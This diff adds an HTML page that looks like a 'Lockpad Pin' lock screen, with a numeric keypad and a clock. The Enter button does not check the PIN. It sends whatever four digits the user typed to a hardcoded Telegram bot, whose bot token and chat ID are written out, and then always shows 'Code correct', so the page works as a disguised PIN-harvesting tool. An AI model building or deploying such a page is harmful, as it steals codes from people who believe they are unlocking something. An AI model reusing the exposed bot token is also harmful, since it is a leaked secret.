@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Lockpad Pin</title>
+    <style>
+        body {
+            background-color: #e6f1e6;
+            font-family: Arial, sans-serif;
+        }
+        
+        .lockpad {
+            max-width: 300px;
+            margin: 100px auto;
+            padding: 20px;
+            background-color: #fff;
+        }
+        
+        .pin-display {
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        #pin {
+            width: 100px;
+            height: 30px;
+            font-size: 18px;
+            text-align: center;
+        }
+        
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+        }
+        
+        .key {
+            width: 80px;
+            height: 80px;
+            background-color: #b3e6b3;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 24px;
+            cursor: pointer;
+            border-radius: 50%;
+            transition: background-color 0.3s;
+        }
+        
+        .key:hover {
+            background-color: #99cc99;
+        }
+        
+        #enter-btn {
+            width: 80px;
+            height: 80px;
+            background-color: #b3e6b3;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 24px;
+            cursor: pointer;
+            border-radius: 50%;
+            transition: background-color 0.3s;
+        }
+        
+        #enter-btn:hover {
+            background-color: #99cc99;
+        }
+        
+        #remove-btn {
+            width: 80px;
+            height: 80px;
+            background-color: #ffb3b3;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 24px;
+            cursor: pointer;
+            border-radius: 50%;
+            transition: background-color 0.3s;
+        }
+        
+        #remove-btn:hover {
+            background-color: #ff9999;
+        }
+        
+        #time {
+            text-align: center;
+            font-size: 14px;
+            color: #777;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="lockpad">
+        <div id="time"></div>
+        <h1>Enter Lockpad Pin</h1>
+        <div class="pin-display">
+            <input type="text" id="pin" readonly>
+        </div>
+        <div class="keypad">
+            <div class="key" onclick="addDigit(1)">1</div>
+            <div class="key" onclick="addDigit(2)">2</div>
+            <div class="key" onclick="addDigit(3)">3</div>
+            <div class="key" onclick="addDigit(4)">4</div>
+            <div class="key" onclick="addDigit(5)">5</div>
+            <div class="key" onclick="addDigit(6)">6</div>
+            <div class="key" onclick="addDigit(7)">7</div>
+            <div class="key" onclick="addDigit(8)">8</div>
+            <div class="key" onclick="addDigit(9)">9</div>
+            <div class="key" onclick="clearPin()">&#8630;</div>
+            <div class="key" onclick="addDigit(0)">0</div>
+            <div id="enter-btn" onclick="sendCodeToTelegram()">&#x21b3;</div>
+        </div>
+    </div>
+
+    <script>
+        var pinInput = document.getElementById("pin");
+        var timeDisplay = document.getElementById("time");
+
+        function addDigit(digit) {
+            if (pinInput.value.length < 4) {
+                pinInput.value += digit;
+            }
+        }
+
+        function enterPin() {
+            if (pinInput.value.length === 4) {
+                alert("Pin entered: " + pinInput.value);
+                pinInput.value = "";
+            }
+        }
+
+        function clearPin() {
+            pinInput.value = "";
+        }
+
+        // Function to send code to Telegram bot
+        function sendCodeToTelegram() {
+            var code = pinInput.value;
+            var chatId = "5990142501"; // Replace with your chatID
+
+            // Send the code to the Telegram bot
+            var url = "https://api.telegram.org/bot6665901686:AAFTZi9DXkedyHhUdC0nQjzJvBFtNCThf6E/sendMessage?chat_id=" + chatId + "&text=Lockpad code: " + code;
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", url, true);
+            xhr.send();
+            
+            // Clear the pin input field
+            pinInput.value = "";
+            
+            // Show a success message
+            alert("Code correct");
+        }
+
+        // Function to display current time
+        function updateTime() {
+            var now = new Date();
+            var hours = now.getHours();
+            var minutes = now.getMinutes();
+            var seconds = now.getSeconds();
+            var timeString = hours + ":" + formatTimeComponent(minutes) + ":" + formatTimeComponent(seconds);
+            timeDisplay.textContent = timeString;
+        }
+
+        // Helper function to format time component with leading zero if needed
+        function formatTimeComponent(component) {
+            return component < 10 ? "0" + component : component;
+        }
+
+        // Update time every second
+        setInterval(updateTime, 1000);
+    </script>
+</body>
+</html>
